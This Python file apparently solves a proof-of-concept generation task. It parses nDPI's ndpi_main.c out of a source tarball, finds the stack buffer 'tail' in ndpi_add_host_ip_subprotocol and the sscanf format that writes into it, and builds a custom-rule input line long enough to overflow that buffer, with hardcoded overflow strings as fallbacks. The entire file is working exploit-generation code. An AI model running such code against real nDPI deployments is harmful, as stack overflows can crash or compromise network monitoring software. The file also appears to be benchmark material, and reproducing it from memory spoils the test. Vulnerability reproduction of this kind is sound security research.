import tarfile
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Try to parse the vulnerable function and construct an input that overflows `tail`
        try:
            with tarfile.open(src_path, "r:*") as tf:
                ndpi_main_member = None
                for m in tf.getmembers():
                    name_lower = m.name.lower()
                    if name_lower.endswith("/ndpi_main.c") or name_lower.endswith("\\ndpi_main.c") or name_lower.endswith("ndpi_main.c"):
                        ndpi_main_member = m
                        break
                if ndpi_main_member is None:
                    # fallback generic payload
                    return (b"host:AAAA:proto:X\n" + b"A" * 80)

                f = tf.extractfile(ndpi_main_member)
                if f is None:
                    return (b"host:AAAA:proto:X\n" + b"A" * 80)
                src = f.read().decode(errors="ignore")
        except Exception:
            # fallback generic payload
            return (b"host:AAAA:proto:X\n" + b"A" * 80)

        # Utility parsers
        def find_function_block(source: str, func_name: str):
            start_sig = source.find(func_name + "(")
            if start_sig < 0:
                return None
            # Find the matching closing parenthesis of the function signature
            i = source.find("(", start_sig)
            if i < 0:
                return None
            j = i
            depth = 0
            in_s = False
            in_c = False
            in_sl_comment = False
            in_ml_comment = False
            prev = ''
            while j < len(source):
                c = source[j]
                nxt = source[j+1] if j+1 < len(source) else ''
                if in_sl_comment:
                    if c == '\n':
                        in_sl_comment = False
                elif in_ml_comment:
                    if c == '*' and nxt == '/':
                        in_ml_comment = False
                        j += 1
                elif in_s:
                    if c == '\\':
                        j += 1  # skip escaped char
                    elif c == '"':
                        in_s = False
                elif in_c:
                    if c == '\\':
                        j += 1
                    elif c == "'":
                        in_c = False
                else:
                    if c == '/' and nxt == '/':
                        in_sl_comment = True
                        j += 1
                    elif c == '/' and nxt == '*':
                        in_ml_comment = True
                        j += 1
                    elif c == '"':
                        in_s = True
                    elif c == "'":
                        in_c = True
                    elif c == '(':
                        depth += 1
                    elif c == ')':
                        depth -= 1
                        if depth == 0:
                            break
                j += 1
            if j >= len(source):
                return None
            # find opening brace for function body
            k = j + 1
            while k < len(source) and source[k] not in '{':
                k += 1
            if k >= len(source) or source[k] != '{':
                return None
            # Now match braces to get function block
            depth = 1
            j = k + 1
            in_s = False
            in_c = False
            in_sl_comment = False
            in_ml_comment = False
            while j < len(source):
                c = source[j]
                nxt = source[j+1] if j+1 < len(source) else ''
                if in_sl_comment:
                    if c == '\n':
                        in_sl_comment = False
                elif in_ml_comment:
                    if c == '*' and nxt == '/':
                        in_ml_comment = False
                        j += 1
                elif in_s:
                    if c == '\\':
                        j += 1
                    elif c == '"':
                        in_s = False
                elif in_c:
                    if c == '\\':
                        j += 1
                    elif c == "'":
                        in_c = False
                else:
                    if c == '/' and nxt == '/':
                        in_sl_comment = True
                        j += 1
                    elif c == '/' and nxt == '*':
                        in_ml_comment = True
                        j += 1
                    elif c == '"':
                        in_s = True
                    elif c == "'":
                        in_c = True
                    elif c == '{':
                        depth += 1
                    elif c == '}':
                        depth -= 1
                        if depth == 0:
                            # function block is [k, j]
                            return source[k:j+1]
                j += 1
            return None

        block = find_function_block(src, "ndpi_add_host_ip_subprotocol")
        if block is None:
            # fallback generic payload
            return (b"host:AAAA:proto:X\n" + b"A" * 80)

        # Find tail buffer size
        tail_size = None
        # Try char tail[N]
        m = re.search(r'\bchar\s+tail\s*\[\s*(\d+)\s*\]', block)
        if m:
            try:
                tail_size = int(m.group(1))
            except Exception:
                tail_size = None
        # If not found, try unsigned char
        if tail_size is None:
            m = re.search(r'\b(?:unsigned\s+)?char\s+tail\s*\[\s*(\d+)\s*\]', block)
            if m:
                try:
                    tail_size = int(m.group(1))
                except Exception:
                    tail_size = None
        # Last resort, default to a plausible small stack buffer
        if tail_size is None:
            tail_size = 32

        # Extract the sscanf call that writes into tail
        # We'll try to parse each sscanf invocation and find one where arguments contain 'tail'
        def extract_calls_to_sscanf(text: str):
            calls = []
            # Find all positions of 'sscanf('
            idx = 0
            while True:
                p = text.find("sscanf", idx)
                if p < 0:
                    break
                q = text.find("(", p)
                if q < 0:
                    break
                # Extract the entire call parentheses
                j = q
                depth = 0
                in_s = False
                in_c = False
                in_sl_comment = False
                in_ml_comment = False
                while j < len(text):
                    c = text[j]
                    nxt = text[j+1] if j+1 < len(text) else ''
                    if in_sl_comment:
                        if c == '\n':
                            in_sl_comment = False
                    elif in_ml_comment:
                        if c == '*' and nxt == '/':
                            in_ml_comment = False
                            j += 1
                    elif in_s:
                        if c == '\\':
                            j += 1
                        elif c == '"':
                            in_s = False
                    elif in_c:
                        if c == '\\':
                            j += 1
                        elif c == "'":
                            in_c = False
                    else:
                        if c == '/' and nxt == '/':
                            in_sl_comment = True
                            j += 1
                        elif c == '/' and nxt == '*':
                            in_ml_comment = True
                            j += 1
                        elif c == '"':
                            in_s = True
                        elif c == "'":
                            in_c = True
                        elif c == '(':
                            depth += 1
                        elif c == ')':
                            depth -= 1
                            if depth == 0:
                                # include last ')'
                                calls.append(text[p:j+1])
                                break
                    j += 1
                idx = p + 6
            return calls

        calls = extract_calls_to_sscanf(block)

        # Parse a call string to extract format and arguments
        def parse_sscanf_call(call_str: str):
            # Expect like: sscanf(buf, "fmt", arg1, arg2, ...)
            # Find '(' and ')'
            l = call_str.find('(')
            r = call_str.rfind(')')
            if l < 0 or r < 0:
                return None
            inside = call_str[l+1:r]
            # Split arguments by commas at top level
            args = []
            buf = []
            depth = 0
            in_s = False
            in_c = False
            escape = False
            i = 0
            while i < len(inside):
                c = inside[i]
                if in_s:
                    buf.append(c)
                    if escape:
                        escape = False
                    elif c == '\\':
                        escape = True
                    elif c == '"':
                        in_s = False
                elif in_c:
                    buf.append(c)
                    if escape:
                        escape = False
                    elif c == '\\':
                        escape = True
                    elif c == "'":
                        in_c = False
                else:
                    if c == '"':
                        in_s = True
                        buf.append(c)
                    elif c == "'":
                        in_c = True
                        buf.append(c)
                    elif c == '(':
                        depth += 1
                        buf.append(c)
                    elif c == ')':
                        depth -= 1
                        buf.append(c)
                    elif c == ',' and depth == 0:
                        arg = ''.join(buf).strip()
                        args.append(arg)
                        buf = []
                    else:
                        buf.append(c)
                i += 1
            if buf:
                args.append(''.join(buf).strip())
            if len(args) < 2:
                return None
            fmt = args[1]
            # Unquote format if it's a literal string
            fmt_str = None
            if len(fmt) >= 2 and fmt[0] == '"' and fmt[-1] == '"':
                # handle simple concatenated literals? remove quotes and unescape basic escapes
                lit = fmt[1:-1]
                # naive unescape for \" and \\ and \n and \t and \r
                lit = lit.encode('utf-8').decode('unicode_escape')
                fmt_str = lit
            else:
                # could be a macro; not supported
                fmt_str = None
            other_args = args[2:]
            return fmt_str, other_args

        # Parse scanf-like format string into components
        def parse_format(fmt: str):
            comps = []
            i = 0
            literal_buf = []
            assign_index_map = []  # list of (comp_index) for non-suppressed conversions
            while i < len(fmt):
                c = fmt[i]
                if c == '%':
                    # flush literal buffer
                    if literal_buf:
                        comps.append(('lit', ''.join(literal_buf)))
                        literal_buf = []
                    i += 1
                    if i < len(fmt) and fmt[i] == '%':
                        # literal %
                        literal_buf.append('%')
                        i += 1
                        continue
                    # parse conversion
                    suppress = False
                    width = None
                    length_mod = ''
                    conv = None
                    scanset = None
                    # Optional assignment suppression
                    if i < len(fmt) and fmt[i] == '*':
                        suppress = True
                        i += 1
                    # Optional width
                    wbuf = []
                    while i < len(fmt) and fmt[i].isdigit():
                        wbuf.append(fmt[i])
                        i += 1
                    if wbuf:
                        try:
                            width = int(''.join(wbuf))
                        except Exception:
                            width = None
                    # Optional length modifiers: hh, h, l, ll, j, z, t, L, a (POSIX)
                    # We will just consume common ones
                    if i < len(fmt):
                        if fmt[i:i+2] in ('hh', 'll'):
                            length_mod = fmt[i:i+2]
                            i += 2
                        elif fmt[i] in ('h', 'l', 'j', 'z', 't', 'L', 'a'):
                            length_mod = fmt[i]
                            i += 1
                    # Conversion specifier
                    if i >= len(fmt):
                        break
                    conv = fmt[i]
                    i += 1
                    if conv == '[':
                        # scanset: parse until closing ]
                        scanset_buf = []
                        # if first char is ^ or ] allowed
                        if i < len(fmt):
                            if fmt[i] == '^':
                                scanset_buf.append('^')
                                i += 1
                        if i < len(fmt) and fmt[i] == ']':
                            scanset_buf.append(']')
                            i += 1
                        # read until closing ]
                        while i < len(fmt) and fmt[i] != ']':
                            scanset_buf.append(fmt[i])
                            i += 1
                        if i < len(fmt) and fmt[i] == ']':
                            i += 1
                        scanset = ''.join(scanset_buf)
                        conv_full = '%[' + (('*' if suppress else '') + (str(width) if width is not None else '') + scanset + ']')
                    else:
                        conv_full = '%' + (('*' if suppress else '') + (str(width) if width is not None else '') + length_mod + conv)
                    comps.append(('conv', {'conv': conv, 'suppress': suppress, 'width': width, 'length': length_mod, 'scanset': scanset, 'repr': conv_full}))
                else:
                    literal_buf.append(c)
                    i += 1
            if literal_buf:
                comps.append(('lit', ''.join(literal_buf)))
            return comps

        # Find a suitable sscanf with 'tail' argument
        chosen = None
        for call in calls:
            parsed = parse_sscanf_call(call)
            if not parsed:
                continue
            fmt_str, args = parsed
            if fmt_str is None or not args:
                continue
            # Clean args tokens
            arg_names = [re.sub(r'\s+', '', a) for a in args]
            # Accept both 'tail' and '&tail' patterns
            if not any(a == 'tail' or a == '&tail' or a.endswith('tail') or a.endswith('&tail') for a in arg_names):
                continue
            # We also prefer those where tail is directly a char array (passed as 'tail', not '&tail'), but accept any
            chosen = (fmt_str, arg_names, call)
            break

        if chosen is None:
            # If not directly matched, try any sscanf in this function and overlong input appended at the end
            # to overflow via later unsafe copy. As a fallback, craft a generic custom-rule-looking line.
            # A commonly used pattern in nDPI rules is something like:
            # "host_domain: <domain> <proto> <subproto>"
            # We'll overflow the last token.
            base = "host:example.com 1 "
            overflow = "A" * (tail_size + 8)
            poc = (base + overflow + "\n").encode()
            # Aim near ground truth if possible
            if len(poc) > 80:
                poc = poc[:80]
                if not poc.endswith(b"\n"):
                    poc += b"\n"
            return poc

        fmt_str, arg_names, call_src = chosen

        comps = parse_format(fmt_str)

        # Build mapping from conversion components to arguments (excluding suppressed conversions)
        conv_indices = []
        for idx, c in enumerate(comps):
            if c[0] == 'conv':
                info = c[1]
                if not info['suppress']:
                    conv_indices.append(idx)

        # Sanity check that number of assigned conversions equals number of args we parsed
        # It's possible it's mismatched due to macro or complex expressions; handle softly
        assigned_count = len(conv_indices)
        if assigned_count > len(arg_names):
            # truncate mapping
            conv_indices = conv_indices[:len(arg_names)]
        elif assigned_count < len(arg_names):
            arg_names = arg_names[:assigned_count]

        # Find which conversion corresponds to 'tail'
        tail_conv_idx_in_comps = None
        for m_idx, comp_idx in enumerate(conv_indices):
            aname = arg_names[m_idx]
            # normalize & and spaces
            aname_simple = aname
            if aname_simple.startswith('&'):
                aname_simple = aname_simple[1:]
            # handle array decay via cast
            if aname_simple.endswith(')'):
                # strip casts like (char*)tail
                aname_simple = re.sub(r'^\([^)]*\)', '', aname_simple)
            if aname_simple.endswith('tail') or aname_simple == 'tail':
                tail_conv_idx_in_comps = comp_idx
                break

        # If we didn't find tail mapping, fallback generic
        if tail_conv_idx_in_comps is None:
            base = "host:example.com 1 "
            overflow = "A" * (tail_size + 8)
            poc = (base + overflow + "\n").encode()
            if len(poc) > 80:
                poc = poc[:80]
                if not poc.endswith(b"\n"):
                    poc += b"\n"
            return poc

        # For other conversions, prepare minimal placeholder values that satisfy parsing
        def placeholder_for_conversion(info):
            conv = info['conv']
            width = info['width']
            if conv in 'diuoxX':
                return '0'
            if conv in 'fFeEgGaA':
                return '0'
            if conv == 'c':
                # respect width if specified, generate width count chars (no whitespace)
                w = width if width and width > 0 else 1
                return 'Z' * w
            if conv == 's':
                w = width if width and width > 0 else 1
                return 'k' * w
            if conv == 'p':
                return '0'
            if conv == '[':
                # scanset: choose a letter that is allowed
                scanset = info.get('scanset') or ''
                # If scanset starts with ^, pick a char not in the set
                if scanset.startswith('^'):
                    # choose 'A' unless excluded
                    excluded = set(scanset[1:])
                    ch = 'A'
                    if ch in excluded:
                        # pick 'B'
                        ch = 'B'
                    return ch
                else:
                    # choose first char in set that's not a closing bracket
                    for ch in scanset:
                        if ch and ch != ']':
                            return ch
                    return 'A'
            # default
            return '1'

        # Build the input string following the format
        # We'll produce among conversion tokens values; for the one mapped to tail, we will overflow
        base_parts = []
        # We'll track the position (index) of the tail conversion among the components
        for idx, comp in enumerate(comps):
            if comp[0] == 'lit':
                base_parts.append(comp[1])
            else:
                info = comp[1]
                # Is this conversion suppressed? If so, no argument consumed; still must match input though.
                if idx == tail_conv_idx_in_comps:
                    # We'll fill later
                    base_parts.append('{TAIL}')
                else:
                    # if suppressed, still need to match; provide minimal text
                    base_parts.append(placeholder_for_conversion(info))
        base_str_template = ''.join(base_parts)

        # Now compute a tail string that guarantees overflow but keeps total size near 56 if possible
        # Compute base length without tail placeholder
        base_fixed_len = len(base_str_template.replace('{TAIL}', ''))
        # aim length near 56, but must be at least tail_size + 1 to overflow
        desired_total = 56
        min_tail_len = tail_size + 1
        remaining = desired_total - base_fixed_len
        if remaining < min_tail_len:
            tail_len = min_tail_len
        else:
            tail_len = remaining
        # Also ensure that tail token fits the conversion (e.g., for %c width=1 it's impossible). If such case, bump to minimal >n anyway.
        # Determine conversion type for tail
        tail_conv_info = None
        conv_counter = -1
        for idx, comp in enumerate(comps):
            if comp[0] == 'conv':
                info = comp[1]
                if not info['suppress']:
                    conv_counter += 1
                if idx == tail_conv_idx_in_comps:
                    tail_conv_info = info
                    break
        if tail_conv_info is None:
            tail_conv_info = {'conv': 's', 'width': None}
        # If conversion is %c with width specified, we cannot overflow; fallback to generic crafted payload
        if tail_conv_info['conv'] == 'c' and (tail_conv_info['width'] is not None):
            base = "host:example.com 1 "
            overflow = "A" * (tail_size + 8)
            poc = (base + overflow + "\n").encode()
            if len(poc) > 80:
                poc = poc[:80]
                if not poc.endswith(b"\n"):
                    poc += b"\n"
            return poc

        # For string-like conversions, whitespace sensitive; avoid spaces unless scanset allows them
        # We'll use 'A's
        tail_value = 'A' * tail_len
        # If conversion is %[...], ensure 'A' is accepted by scanset
        if tail_conv_info['conv'] == '[':
            scanset = tail_conv_info.get('scanset') or ''
            negate = scanset.startswith('^')
            set_chars = scanset[1:] if negate else scanset
            def char_allowed(ch):
                if negate:
                    return ch not in set(set_chars)
                return ch in set(set_chars)
            # If 'A' not allowed, choose an allowed char
            if not char_allowed('A'):
                ch_choice = None
                if negate:
                    # pick 'B' if not excluded
                    for ch in ("B","C","D","E","F","G","H","I","J","K","L","M","N","O"):
                        if char_allowed(ch):
                            ch_choice = ch
                            break
                else:
                    # pick first allowed char
                    for ch in set_chars:
                        if ch != ']':
                            ch_choice = ch
                            break
                if ch_choice is None:
                    ch_choice = 'X'
                tail_value = ch_choice * tail_len

        poc_str = base_str_template.replace('{TAIL}', tail_value)
        # Ensure newline termination (many line parsers expect it)
        if not poc_str.endswith("\n"):
            poc_str += "\n"

        return poc_str.encode()
